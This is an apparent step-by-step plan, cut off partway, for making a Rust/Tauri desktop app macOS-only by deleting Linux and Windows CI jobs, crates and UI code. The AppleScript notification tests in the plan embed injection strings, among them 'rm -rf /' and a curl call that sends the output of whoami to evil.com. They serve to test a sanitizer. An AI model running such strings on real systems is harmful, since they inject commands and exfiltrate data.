# macOS-Only Cleanup Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Remove all Linux and Windows platform support from CI/CD, release scripts, Tauri config, Rust crates, and the desktop UI so the repository is macOS-only.

**Architecture:** Delete Linux/Windows-specific files and CI jobs, strip `#[cfg(target_os = "linux")]` / `#[cfg(windows)]` branches from Rust code, collapse desktop UI platform utilities to macOS-only behavior, and verify with macOS fmt/clippy/nextest/Tauri build.

**Tech Stack:** GitHub Actions, Rust/Cargo/Tauri, Bun/Vite/React.

---

## Task 1: Remove Docker CI and Linux/Windows release artifact jobs

**Files:**
- Delete: `docker/Dockerfile.ci`
- Delete: `.dockerignore`
- Delete: `scripts/run-docker-ci.sh`
- Modify: `.github/workflows/release-build-artifacts.yml`

- [ ] **Step 1: Delete Docker CI files**

```bash
rm docker/Dockerfile.ci .dockerignore scripts/run-docker-ci.sh
```

- [ ] **Step 2: Remove `build-linux-x86_64` and `build-windows-x86_64` jobs from release-build-artifacts.yml**

Replace everything from `  build-linux-x86_64:` to the end of the file with nothing, keeping only the `build-macos` job.

`old_string`:
```yaml
  build-linux-x86_64:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install system dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y libgtk-3-dev libwebkit2gtk-4.1-dev libappindicator3-dev librsvg2-dev libglib2.0-dev patchelf libasound2-dev libfuse2

      - name: Install Rust toolchain
        uses: dtolnay/rust-toolchain@stable
        with:
          targets: x86_64-unknown-linux-gnu

      - name: Rust cache
        uses: Swatinem/rust-cache@v2

      - name: Install Bun
        uses: oven-sh/setup-bun@v2
        with:
          bun-version: latest

      - name: Install protoc
        uses: arduino/setup-protoc@v3
        with:
          repo-token: ${{ secrets.GITHUB_TOKEN }}

      - name: Install cargo-binstall
        uses: taiki-e/install-action@v2
        with:
          tool: cargo-binstall

      - name: Install cargo-tauri
        run: cargo binstall tauri-cli -y

      - name: Install dependencies
        working-directory: desktop-ui
        run: bun install --frozen-lockfile

      - name: Inject release version
        run: python3 scripts/inject-release-version.py ${{ inputs.version }}

      - name: Prepare Tauri signing secrets
        env:
          KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
          PASS: ${{ secrets.TAURI_KEY_PASSWORD }}
        run: |
          trim() {
            printf '%s' "$1" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//'
          }
          if [ -n "$KEY" ]; then
            {
              echo "TAURI_SIGNING_PRIVATE_KEY<<EOF"
              trim "$KEY"
              echo ""
              echo "EOF"
            } >> "$GITHUB_ENV"
          fi
          if [ -n "$PASS" ]; then
            {
              echo "TAURI_KEY_PASSWORD<<EOF"
              trim "$PASS"
              echo ""
              echo "EOF"
            } >> "$GITHUB_ENV"
          fi

      - name: Build Tauri app
        working-directory: crates/desktop
        run: cargo tauri build --target x86_64-unknown-linux-gnu --bundles appimage

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: release-assets-linux-x86_64
          path: |
            target/x86_64-unknown-linux-gnu/release/bundle/appimage/*.AppImage
            target/x86_64-unknown-linux-gnu/release/bundle/appimage/*.AppImage.sig
          if-no-files-found: error

  build-windows-x86_64:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install Rust toolchain
        uses: dtolnay/rust-toolchain@stable
        with:
          targets: x86_64-pc-windows-msvc

      - name: Rust cache
        uses: Swatinem/rust-cache@v2

      - name: Install Bun
        uses: oven-sh/setup-bun@v2
        with:
          bun-version: latest

      - name: Install protoc
        uses: arduino/setup-protoc@v3
        with:
          repo-token: ${{ secrets.GITHUB_TOKEN }}

      - name: Install cargo-binstall
        uses: taiki-e/install-action@v2
        with:
          tool: cargo-binstall

      - name: Install cargo-tauri
        run: cargo binstall tauri-cli -y

      - name: Install dependencies
        working-directory: desktop-ui
        run: bun install --frozen-lockfile

      - name: Inject release version
        run: python3 scripts/inject-release-version.py ${{ inputs.version }}

      - name: Prepare Tauri signing secrets
        shell: bash
        env:
          KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
          PASS: ${{ secrets.TAURI_KEY_PASSWORD }}
        run: |
          trim() {
            printf '%s' "$1" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//'
          }
          if [ -n "$KEY" ]; then
            {
              echo "TAURI_SIGNING_PRIVATE_KEY<<EOF"
              trim "$KEY"
              echo ""
              echo "EOF"
            } >> "$GITHUB_ENV"
          fi
          if [ -n "$PASS" ]; then
            {
              echo "TAURI_KEY_PASSWORD<<EOF"
              trim "$PASS"
              echo ""
              echo "EOF"
            } >> "$GITHUB_ENV"
          fi

      - name: Build Tauri app
        working-directory: crates/desktop
        run: cargo tauri build --target x86_64-pc-windows-msvc --bundles nsis

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: release-assets-windows-x86_64
          path: |
            target/x86_64-pc-windows-msvc/release/bundle/nsis/*.exe
            target/x86_64-pc-windows-msvc/release/bundle/nsis/*.exe.sig
            target/x86_64-pc-windows-msvc/release/bundle/nsis/*.nsis.zip
            target/x86_64-pc-windows-msvc/release/bundle/nsis/*.nsis.zip.sig
          if-no-files-found: error
```

`new_string`: *(empty)*

- [ ] **Step 3: Commit**

```bash
git add -A
git commit -m "ci: remove Docker CI and Linux/Windows release artifact jobs"
```

---

## Task 2: Move CI quality gates to macOS

**Files:**
- Modify: `.github/workflows/ci.yml`

- [ ] **Step 1: Change `rust-quality` and `desktop-ui-quality` runners to `macos-latest` and drop Linux system deps**

`old_string`:
```yaml
  rust-quality:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install system dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y libgtk-3-dev libwebkit2gtk-4.1-dev libappindicator3-dev librsvg2-dev libglib2.0-dev libasound2-dev

      - name: Install Rust toolchain
```

`new_string`:
```yaml
  rust-quality:
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install Rust toolchain
```

`old_string`:
```yaml
      - name: Build klynt-sandbox-helper for tests
        run: |
          cargo build -p klynt-sandbox-helper
          echo "$PWD/target/debug" >> "$GITHUB_PATH"

      - name: cargo fmt
```

`new_string`:
```yaml
      - name: cargo fmt
```

`old_string`:
```yaml
  desktop-ui-quality:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install Bun
```

`new_string`:
```yaml
  desktop-ui-quality:
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install Bun
```

- [ ] **Step 2: Commit**

```bash
git add .github/workflows/ci.yml
git commit -m "ci: run quality gates on macOS and drop Linux sandbox helper build"
```

---

## Task 3: Switch release orchestration runners to macOS

**Files:**
- Modify: `.github/workflows/release.yml`
- Modify: `.github/workflows/release-stable.yml`

- [ ] **Step 1: In `release.yml`, replace all three `runs-on: ubuntu-latest` with `runs-on: macos-latest`**

Affected jobs: `version`, `create-release`, `publish-manifest`.

`old_string`:
```yaml
  version:
    runs-on: ubuntu-latest
```

`new_string`:
```yaml
  version:
    runs-on: macos-latest
```

(Repeat for `create-release` and `publish-manifest`.)

- [ ] **Step 2: In `release-stable.yml`, replace all three `runs-on: ubuntu-latest` with `runs-on: macos-latest`**

Affected jobs: `version`, `create-release`, `publish-manifest`.

- [ ] **Step 3: Commit**

```bash
git add .github/workflows/release.yml .github/workflows/release-stable.yml
git commit -m "ci: run release orchestration on macOS"
```

---

## Task 4: Update updater manifest generator

**Files:**
- Modify: `scripts/generate-updater-manifest.py`

- [ ] **Step 1: Keep only darwin entries in `PLATFORM_MAP`**

`old_string`:
```python
PLATFORM_MAP = {
    "_aarch64.app.tar.gz": "darwin-aarch64",
    "_x86_64.app.tar.gz": "darwin-x86_64",
    "_amd64.AppImage": "linux-x86_64",
    "_x64-setup.exe": "windows-x86_64",
}
```

`new_string`:
```python
PLATFORM_MAP = {
    "_aarch64.app.tar.gz": "darwin-aarch64",
    "_x86_64.app.tar.gz": "darwin-x86_64",
}
```

- [ ] **Step 2: Commit**

```bash
git add scripts/generate-updater-manifest.py
git commit -m "build: generate updater manifest for macOS only"
```

---

## Task 5: Remove Windows icon from Tauri config

**Files:**
- Modify: `crates/desktop/tauri.conf.json`
- Delete: `crates/desktop/icons/icon.ico`

- [ ] **Step 1: Remove `icons/icon.ico` from the icon array**

`old_string`:
```json
    "icon": [
      "icons/32x32.png",
      "icons/128x128.png",
      "icons/128x128@2x.png",
      "icons/icon.ico"
    ],
```

`new_string`:
```json
    "icon": [
      "icons/32x32.png",
      "icons/128x128.png",
      "icons/128x128@2x.png"
    ],
```

- [ ] **Step 2: Delete the icon file**

```bash
rm crates/desktop/icons/icon.ico
```

- [ ] **Step 3: Commit**

```bash
git add -A
git commit -m "chore(desktop): remove Windows icon asset and config reference"
```

---

## Task 6: Delete the Linux-only sandbox helper crate

**Files:**
- Delete directory: `crates/klynt-sandbox-helper/`
- Modify: `Cargo.toml`

- [ ] **Step 1: Remove the crate directory**

```bash
rm -rf crates/klynt-sandbox-helper
```

- [ ] **Step 2: Remove it from the workspace members**

`old_string`:
```toml
    "crates/klynt-sandbox",
    "crates/klynt-sandbox-helper",
    "crates/klynt-skill-loader",
```

`new_string`:
```toml
    "crates/klynt-sandbox",
    "crates/klynt-skill-loader",
```

- [ ] **Step 3: Remove unused workspace dependencies `landlock` and `nix`**

`old_string`:
```toml
landlock = "0.4"
nix = { version = "0.31", features = ["process"] }
tauri = { version = "2.11", features = ["macos-private-api", "tray-icon", "image-png", "devtools"] }
```

`new_string`:
```toml
tauri = { version = "2.11", features = ["macos-private-api", "tray-icon", "image-png", "devtools"] }
```

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "chore(sandbox): remove Linux-only klynt-sandbox-helper crate"
```

---

## Task 7: Clean up Linux-specific code in `klynt-sandbox`

**Files:**
- Delete: `crates/klynt-sandbox/src/linux.rs`
- Delete: `crates/klynt-sandbox/src/bwrap.rs`
- Delete: `crates/klynt-sandbox/src/helper_proto.rs`
- Delete: `crates/klynt-sandbox/tests/linux_smoke.rs`
- Delete: `crates/klynt-sandbox/tests/helper_locator.rs`
- Delete: `crates/klynt-sandbox/tests/bwrap_args.rs`
- Modify: `crates/klynt-sandbox/src/lib.rs`
- Modify: `crates/klynt-sandbox/Cargo.toml`

- [ ] **Step 1: Delete Linux modules and tests**

```bash
rm crates/klynt-sandbox/src/linux.rs \
   crates/klynt-sandbox/src/bwrap.rs \
   crates/klynt-sandbox/src/helper_proto.rs \
   crates/klynt-sandbox/tests/linux_smoke.rs \
   crates/klynt-sandbox/tests/helper_locator.rs \
   crates/klynt-sandbox/tests/bwrap_args.rs
```

- [ ] **Step 2: Simplify `src/lib.rs`**

`old_string`:
```rust
#[cfg(target_os = "linux")]
pub mod bwrap;
pub mod error;
#[cfg(target_os = "linux")]
pub mod helper_proto;
#[cfg(target_os = "linux")]
pub mod linux;
pub mod policy;
pub mod runner;
#[cfg(target_os = "macos")]
pub mod seatbelt;

pub use error::SandboxError;
#[cfg(target_os = "linux")]
pub use linux::LinuxSandboxRunner;
pub use policy::{FsConstraints, NetworkConstraints, SandboxPolicy};
pub use runner::{CommandOutput, SandboxRunner};
#[cfg(target_os = "macos")]
pub use seatbelt::MacOsSeatbeltRunner;
```

`new_string`:
```rust
pub mod error;
pub mod policy;
pub mod runner;
pub mod seatbelt;

pub use error::SandboxError;
pub use policy::{FsConstraints, NetworkConstraints, SandboxPolicy};
pub use runner::{CommandOutput, SandboxRunner};
pub use seatbelt::MacOsSeatbeltRunner;
```

- [ ] **Step 3: Update `Cargo.toml` description and dependencies**

`old_string`:
```toml
[package]
name = "klynt-sandbox"
version = "0.0.1"
edition = "2021"
license = "Apache-2.0"
description = "Klynt sandbox — Seatbelt (.sbpl) for macOS, Landlock+bwrap for Linux. Adapted from codex-rs/sandboxing/."

[dependencies]
common = { path = "../common" }
serde = { workspace = true, features = ["derive"] }
thiserror = { workspace = true }
sha2 = { workspace = true }
hex.workspace = true
async-trait = { workspace = true }

[target.'cfg(target_os = "macos")'.dependencies]
tokio = { workspace = true, features = ["process", "rt", "macros", "time"] }

[target.'cfg(target_os = "linux")'.dependencies]
base64 = { workspace = true }
serde_json = { workspace = true }
which = { workspace = true }
tokio = { workspace = true, features = ["process", "rt", "macros", "time"] }
```

`new_string`:
```toml
[package]
name = "klynt-sandbox"
version = "0.0.1"
edition = "2021"
license = "Apache-2.0"
description = "Klynt sandbox — Seatbelt (.sbpl) for macOS."

[dependencies]
common = { path = "../common" }
serde = { workspace = true, features = ["derive"] }
thiserror = { workspace = true }
sha2 = { workspace = true }
hex.workspace = true
async-trait = { workspace = true }
tokio = { workspace = true, features = ["process", "rt", "macros", "time"] }
```

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "chore(sandbox): remove Linux sandbox implementation and tests"
```

---

## Task 8: Remove Linux/Windows branches in shared crates

**Files:**
- Modify: `crates/klynt-process-hardening/src/lib.rs`
- Modify: `crates/common/src/notify.rs`
- Modify: `crates/desktop/src/notify.rs`
- Modify: `crates/klynt-execpolicy/src/executable_name.rs`
- Modify: `crates/klynt-pty/src/lib.rs`

- [ ] **Step 1: Simplify `crates/klynt-process-hardening/src/lib.rs` to macOS only**

Replace the entire file with:

```rust
use std::ffi::OsString;
use std::os::unix::ffi::OsStrExt;

/// Pre-main hardening: disables core dumps, blocks ptrace attach on macOS,
/// and removes dangerous env vars (DYLD_*, MallocStackLogging*).
///
/// Call from a `#[ctor::ctor]` or as the very first line of `fn main()`.
pub fn pre_main_hardening() {
    pre_main_hardening_macos();
}

const PTRACE_DENY_ATTACH_FAILED_EXIT_CODE: i32 = 6;
const SET_RLIMIT_CORE_FAILED_EXIT_CODE: i32 = 7;

fn pre_main_hardening_macos() {
    let ret_code = unsafe { libc::ptrace(libc::PT_DENY_ATTACH, 0, std::ptr::null_mut(), 0) };
    if ret_code == -1 {
        eprintln!(
            "ERROR: ptrace(PT_DENY_ATTACH) failed: {}",
            std::io::Error::last_os_error()
        );
        std::process::exit(PTRACE_DENY_ATTACH_FAILED_EXIT_CODE);
    }
    set_core_file_size_limit_to_zero();
    remove_env_vars_with_prefix(b"DYLD_");
    remove_env_vars_with_prefix(b"MallocStackLogging");
    remove_env_vars_with_prefix(b"MallocLogFile");
}

fn set_core_file_size_limit_to_zero() {
    let rlim = libc::rlimit {
        rlim_cur: 0,
        rlim_max: 0,
    };
    let ret_code = unsafe { libc::setrlimit(libc::RLIMIT_CORE, &rlim) };
    if ret_code != 0 {
        eprintln!(
            "ERROR: setrlimit(RLIMIT_CORE) failed: {}",
            std::io::Error::last_os_error()
        );
        std::process::exit(SET_RLIMIT_CORE_FAILED_EXIT_CODE);
    }
}

fn remove_env_vars_with_prefix(prefix: &[u8]) {
    for key in env_keys_with_prefix(std::env::vars_os(), prefix) {
        unsafe {
            std::env::remove_var(key);
        }
    }
}

fn env_keys_with_prefix<I>(vars: I, prefix: &[u8]) -> Vec<OsString>
where
    I: IntoIterator<Item = (OsString, OsString)>,
{
    vars.into_iter()
        .filter_map(|(key, _)| {
            key.as_os_str()
                .as_bytes()
                .starts_with(prefix)
                .then_some(key)
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::ffi::OsStr;
    use std::os::unix::ffi::OsStrExt;
    use std::os::unix::ffi::OsStringExt;

    #[test]
    fn env_keys_with_prefix_handles_non_utf8_entries() {
        let non_utf8_key1 = OsStr::from_bytes(b"R\xD6DBURK").to_os_string();
        assert!(non_utf8_key1.clone().into_string().is_err());
        let non_utf8_key2 = OsString::from_vec(vec![b'L', b'D', b'_', 0xF0]);
        assert!(non_utf8_key2.clone().into_string().is_err());

        let non_utf8_value = OsString::from_vec(vec![0xF0, 0x9F, 0x92, 0xA9]);

        let keys = env_keys_with_prefix(
            vec![
                (non_utf8_key1, non_utf8_value.clone()),
                (non_utf8_key2.clone(), non_utf8_value),
            ],
            b"LD_",
        );
        assert_eq!(keys, vec![non_utf8_key2]);
    }

    #[test]
    fn env_keys_with_prefix_filters_only_matching_keys() {
        let ld_test_var = OsStr::from_bytes(b"LD_TEST");
        let vars = vec![
            (OsString::from("PATH"), OsString::from("/usr/bin")),
            (ld_test_var.to_os_string(), OsString::from("1")),
            (OsString::from("DYLD_FOO"), OsString::from("bar")),
        ];

        let keys = env_keys_with_prefix(vars, b"LD_");
        assert_eq!(keys.len(), 1);
        assert_eq!(keys[0].as_os_str(), ld_test_var);
    }
}
```

- [ ] **Step 2: Simplify `crates/common/src/notify.rs` to macOS only**

Replace the entire file with:

```rust
//! OS native notification support for macOS.
//!
//! Uses tokio::process::Command for async compatibility.

use crate::ports::NotificationSender;
use crate::Result;

/// macOS implementation — delegates to the `osascript` helpers below.
pub struct OsNotificationSender;

#[async_trait::async_trait]
impl NotificationSender for OsNotificationSender {
    async fn send(&self, title: &str, body: &str) -> Result<()> {
        send_os_notification(title, body).await
    }

    async fn send_critical(&self, title: &str, body: &str) -> Result<()> {
        send_os_notification_critical(title, body).await
    }
}

/// Sanitize text for embedding in an AppleScript double-quoted string.
fn sanitize_for_applescript(text: &str) -> String {
    let mut out = String::with_capacity(text.len() + 16);
    for ch in text.chars() {
        match ch {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            c if c.is_control() => {}
            c => out.push(c),
        }
    }
    out
}

/// Send a native OS notification via AppleScript.
pub async fn send_os_notification(title: &str, body: &str) -> Result<()> {
    use tokio::process::Command;

    let safe_title = sanitize_for_applescript(title);
    let safe_body = sanitize_for_applescript(body);

    let script = format!(
        "display notification \"{}\" with title \"{}\"",
        safe_body, safe_title
    );

    Command::new("osascript")
        .args(["-e", &script])
        .output()
        .await?;

    Ok(())
}

/// Build the AppleScript string for a critical notification (pure, testable).
pub fn build_critical_script(title: &str, body: &str) -> String {
    let safe_title = sanitize_for_applescript(title);
    let safe_body = sanitize_for_applescript(body);
    format!(
        "display notification \"{}\" with title \"URGENT · {}\" sound name \"Ping\"",
        safe_body, safe_title
    )
}

/// Send a native OS notification with elevated urgency.
pub async fn send_os_notification_critical(title: &str, body: &str) -> Result<()> {
    use tokio::process::Command;
    let script = build_critical_script(title, body);
    Command::new("osascript")
        .args(["-e", &script])
        .output()
        .await?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plain_text_unchanged() {
        assert_eq!(sanitize_for_applescript("hello world"), "hello world");
    }

    #[test]
    fn escapes_backslash() {
        assert_eq!(
            sanitize_for_applescript("path\\to\\file"),
            "path\\\\to\\\\file"
        );
    }

    #[test]
    fn escapes_double_quote() {
        assert_eq!(sanitize_for_applescript(r#"say "hi""#), "say \\\"hi\\\"");
    }

    #[test]
    fn strips_newlines_and_carriage_returns() {
        assert_eq!(
            sanitize_for_applescript("line1\nline2\rline3"),
            "line1line2line3"
        );
    }

    #[test]
    fn strips_null_bytes() {
        assert_eq!(sanitize_for_applescript("before\0after"), "beforeafter");
    }

    #[test]
    fn strips_tabs() {
        assert_eq!(sanitize_for_applescript("col1\tcol2"), "col1col2");
    }

    #[test]
    fn injection_do_shell_script() {
        let input = r#"" & do shell script "whoami" & ""#;
        let sanitized = sanitize_for_applescript(input);
        assert!(
            !sanitized.contains('\n') || sanitized.replace("\\\"", "").find('"').is_none()
        );
        assert!(sanitized.contains("\\\""));
    }

    #[test]
    fn injection_newline_breakout() {
        let input = "\"\ndo shell script \"rm -rf /\"\n\"";
        let sanitized = sanitize_for_applescript(input);
        assert!(!sanitized.contains('\n'));
        assert!(!sanitized.contains('\r'));
    }

    #[test]
    fn unicode_preserved() {
        let input = "Hello 🌍 café résumé";
        assert_eq!(sanitize_for_applescript(input), input);
    }

    #[test]
    fn critical_applescript_includes_sound_and_urgent_prefix() {
        let script = build_critical_script("My Title", "My Body");
        assert!(script.contains("sound name"), "script must contain sound name clause: {script}");
        assert!(
            script.contains("URGENT · "),
            "script must contain URGENT · prefix: {script}"
        );
    }

    #[test]
    fn critical_applescript_sanitizes_input() {
        let script = build_critical_script("title\"injection", "body\nnewline");
        assert!(
            script.contains("title\\\"injection"),
            "double-quote in title must be escaped: {script}"
        );
        assert!(!script.contains('\n'), "raw newline must be stripped: {script}");
    }

    #[test]
    fn combined_attack_vector() {
        let input = "test\"; do shell script \"curl http://evil.com/$(whoami)\"\n--";
        let sanitized = sanitize_for_applescript(input);
        assert!(!sanitized.contains('\n'));
        let clean = sanitized.replace("\\\"", "");
        assert!(!clean.contains('"'), "unescaped double-quote found: {sanitized}");
    }
}
```

- [ ] **Step 3: Simplify `crates/desktop/src/notify.rs` fallback**

`old_string`:
```rust
#[cfg(target_os = "linux")]
fn platform_fallback_notify(title: &str, body: &str) -> Result<()> {
    std::process::Command::new("notify-send")
        .arg(title)
        .arg(body)
        .status()?;
    Ok(())
}

#[cfg(not(target_os = "linux"))]
fn platform_fallback_notify(_title: &str, _body: &str) -> Result<()> {
    Err(common::KlyntbotError::Io(std::io::Error::other(
        "no platform notification fallback available",
    )))
}
```

`new_string`:
```rust
fn platform_fallback_notify(_title: &str, _body: &str) -> Result<()> {
    Err(common::KlyntbotError::Io(std::io::Error::other(
        "no platform notification fallback available",
    )))
}
```

Also update the doc comment above `send_sync_with_fallback` to remove the Linux reference.

- [ ] **Step 4: Simplify `crates/klynt-execpolicy/src/executable_name.rs`**

Replace the entire file with:

```rust
use std::path::Path;

pub(crate) fn executable_lookup_key(raw: &str) -> String {
    raw.to_string()
}

pub(crate) fn executable_path_lookup_key(path: &Path) -> Option<String> {
    path.file_name()
        .and_then(|name| name.to_str())
        .map(executable_lookup_key)
}
```

- [ ] **Step 5: Remove Linux-only `prctl` from `crates/klynt-pty/src/lib.rs`**

`old_string`:
```rust
    #[cfg(unix)]
    unsafe {
        cmd.pre_exec(|| {
            // Own process group so cancel can signal the entire tree.
            if libc::setpgid(0, 0) != 0 {
                return Err(std::io::Error::last_os_error());
            }
            // Linux: when the parent dies, kernel sends SIGTERM to children.
            #[cfg(target_os = "linux")]
            {
                if libc::prctl(libc::PR_SET_PDEATHSIG, libc::SIGTERM) != 0 {
                    return Err(std::io::Error::last_os_error());
                }
            }
            Ok(())
        });
    }
```

`new_string`:
```rust
    #[cfg(unix)]
    unsafe {
        cmd.pre_exec(|| {
            // Own process group so cancel can signal the entire tree.
            if libc::setpgid(0, 0) != 0 {
                return Err(std::io::Error::last_os_error());
            }
            Ok(())
        });
    }
```

- [ ] **Step 6: Commit**

```bash
git add -A
git commit -m "chore: remove Linux/Windows branches in shared crates"
```

---

## Task 9: Simplify desktop UI platform utilities

**Files:**
- Modify: `desktop-ui/src/utils/platformPaths.ts`
- Modify: `desktop-ui/src/utils/shortcuts.ts`
- Modify: `desktop-ui/src/utils/shortcuts.test.ts`
- Modify: `desktop-ui/src/features/app/orchestration/useLayoutOrchestration.ts`
- Modify: `desktop-ui/src/features/settings/hooks/useSettingsViewOrchestration.ts`
- Modify: `desktop-ui/src/features/app/constants.ts`
- Delete: `desktop-ui/src/features/layout/components/WindowCaptionControls.tsx`
- Delete: `desktop-ui/src/features/layout/components/WindowCaptionControls.test.tsx`
- Modify: `desktop-ui/src/features/app/components/MainAppShell.tsx`

- [ ] **Step 1: Replace `platformPaths.ts` with the macOS-only version**

Replace the entire file with:

```typescript
type PlatformKind = "mac" | "unknown";

function platformKind(): PlatformKind {
  if (typeof navigator === "undefined") {
    return "unknown";
  }
  const platform =
    (navigator as Navigator & { userAgentData?: { platform?: string } }).userAgentData?.platform ??
    navigator.platform ??
    "";
  return platform.toLowerCase().includes("mac") ? "mac" : "unknown";
}

export function isMacPlatform(): boolean {
  return platformKind() === "mac";
}

export function isMobilePlatform(): boolean {
  if (typeof navigator === "undefined") {
    return false;
  }
  const platform =
    (navigator as Navigator & { userAgentData?: { platform?: string } }).userAgentData?.platform ??
    navigator.platform ??
    "";
  const normalizedPlatform = platform.toLowerCase();
  const userAgent = (navigator.userAgent ?? "").toLowerCase();
  const maxTouchPoints =
    typeof (navigator as Navigator).maxTouchPoints === "number"
      ? (navigator as Navigator).maxTouchPoints
      : 0;
  const hasTouch = maxTouchPoints > 0;
  const hasMobileUserAgentToken =
    userAgent.includes("mobile") ||
    userAgent.includes("iphone") ||
    userAgent.includes("ipad") ||
    userAgent.includes("ipod") ||
    userAgent.includes("android");
  const iPadDesktopMode =
    normalizedPlatform.includes("mac") &&
    hasTouch &&
    (hasMobileUserAgentToken || userAgent.includes("like mac os x"));
  return (
    normalizedPlatform.includes("iphone") ||
    normalizedPlatform.includes("ipad") ||
    normalizedPlatform.includes("android") ||
    hasMobileUserAgentToken ||
    iPadDesktopMode
  );
}

export function fileManagerName(): string {
  return "Finder";
}

export function revealInFileManagerLabel(): string {
  return "Reveal in Finder";
}

export function openInFileManagerLabel(): string {
  return "Open in Finder";
}

export function isAbsolutePath(value: string): boolean {
  const trimmed = value.trim();
  return Boolean(trimmed) && (trimmed.startsWith("/") || trimmed.startsWith("~/"));
}

function stripTrailingSeparators(value: string) {
  return value.replace(/[/]+$/, "");
}

function stripLeadingSeparators(value: string) {
  return value.replace(/^[/]+/, "");
}

export function joinWorkspacePath(base: string, path: string): string {
  const trimmedBase = base.trim();
  const trimmedPath = path.trim();
  if (!trimmedBase) {
    return trimmedPath;
  }
  if (!trimmedPath || isAbsolutePath(trimmedPath)) {
    return trimmedPath;
  }

  const baseWithoutTrailing = stripTrailingSeparators(trimmedBase);
  const pathWithoutLeading = stripLeadingSeparators(trimmedPath);
  return `${baseWithoutTrailing}/${pathWithoutLeading}`;
}
```

- [ ] **Step 2: Replace `shortcuts.ts` with the macOS-only version**

Replace the entire file with:

```typescript
import { isMacPlatform as isMacPlatformFromPaths } from "./platformPaths";

export type ShortcutDefinition = {
  key: string;
  meta: boolean;
  ctrl: boolean;
  alt: boolean;
  shift: boolean;
};

const MODIFIER_ORDER = ["cmd", "ctrl", "alt", "shift"] as const;
const MODIFIER_LABELS_MAC: Record<string, string> = {
  cmd: "⌘",
  ctrl: "⌃",
  alt: "⌥",
  shift: "⇧",
};

const KEY_LABELS: Record<string, string> = {
  " ": "Space",
  space: "Space",
  escape: "Esc",
  arrowup: "↑",
  arrowdown: "↓",
  arrowleft: "←",
  arrowright: "→",
};

const ACCELERATOR_KEYS: Record<string, string> = {
  " ": "Space",
  space: "Space",
  escape: "Esc",
  esc: "Esc",
  enter: "Enter",
  return: "Enter",
  tab: "Tab",
  backspace: "Backspace",
  delete: "Delete",
  arrowup: "Up",
  arrowdown: "Down",
  arrowleft: "Left",
  arrowright: "Right",
};

const MODIFIER_KEYS = new Set(["shift", "control", "alt", "meta"]);

function normalizeKey(key: string) {
  const normalized = key.toLowerCase();
  if (MODIFIER_KEYS.has(normalized)) {
    return null;
  }
  if (normalized === " ") {
    return "space";
  }
  return normalized;
}

export function parseShortcut(value: string | null | undefined): ShortcutDefinition | null {
  if (!value) {
    return null;
  }
  const parts = value
    .split("+")
    .map((part) => part.trim().toLowerCase())
    .filter(Boolean);
  if (parts.length === 0) {
    return null;
  }
  const key = parts[parts.length - 1] ?? "";
  if (!key || MODIFIER_KEYS.has(key)) {
    return null;
  }
  return {
    key,
    meta: parts.includes("cmd") || parts.includes("meta"),
    ctrl: parts.includes("ctrl") || parts.includes("control"),
    alt: parts.includes("alt") || parts.includes("option"),
    shift: parts.includes("shift"),
  };
}

export function formatShortcut(value: string | null | undefined): string {
  if (!value) {
    return "Not set";
  }
  const parsed = parseShortcut(value);
  if (!parsed) {
    return value;
  }
  const modifiers = MODIFIER_ORDER.flatMap((modifier) => {
    if (modifier === "cmd" && parsed.meta) {
      return MODIFIER_LABELS_MAC.cmd;
    }
    if (modifier === "ctrl" && parsed.ctrl) {
      return MODIFIER_LABELS_MAC.ctrl;
    }
    if (modifier === "alt" && parsed.alt) {
      return MODIFIER_LABELS_MAC.alt;
    }
    if (modifier === "shift" && parsed.shift) {
      return MODIFIER_LABELS_MAC.shift;
    }
    return [];
  });
  const keyLabel =
    KEY_LABELS[parsed.key] ?? (parsed.key.length === 1 ? parsed.key.toUpperCase() : parsed.key);
  return [...modifiers, keyLabel].join("");
}

export function buildShortcutValue(event: KeyboardEvent): string | null {
  const key = normalizeKey(event.key);
  if (!key) {
    return null;
  }
  const hasPrimaryModifier = event.metaKey || event.ctrlKey || event.altKey;
  const allowShiftOnly = event.shiftKey && key === "tab";
  if (!hasPrimaryModifier && !allowShiftOnly) {
    return null;
  }
  const modifiers = [];
  if (event.metaKey) {
    modifiers.push("cmd");
  }
  if (event.ctrlKey) {
    modifiers.push("ctrl");
  }
  if (event.altKey) {
    modifiers.push("alt");
  }
  if (event.shiftKey) {
    modifiers.push("shift");
  }
  return [...modifiers, key].join("+");
}

export function matchesShortcut(event: KeyboardEvent, value: string | null | undefined): boolean {
  const parsed = parseShortcut(value);
  if (!parsed) {
    return false;
  }
  const key = normalizeKey(event.key);
  if (!key || key !== parsed.key) {
    return false;
  }
  return (
    parsed.meta === event.metaKey &&
    parsed.ctrl === event.ctrlKey &&
    parsed.alt === event.altKey &&
    parsed.shift === event.shiftKey
  );
}

export function isMacPlatform(): boolean {
  return isMacPlatformFromPaths();
}

export function getDefaultInterruptShortcut(): string {
  return "ctrl+c";
}

export function toMenuAccelerator(value: string | null | undefined): string | null {
  const parsed = parseShortcut(value);
  if (!parsed) {
    return null;
  }
  const parts: string[] = [];
  if (parsed.meta && parsed.ctrl) {
    parts.push("Cmd");
    parts.push("Ctrl");
  } else if (parsed.meta) {
    parts.push("CmdOrCtrl");
  } else if (parsed.ctrl) {
    parts.push("Ctrl");
  }
  if (parsed.alt) {
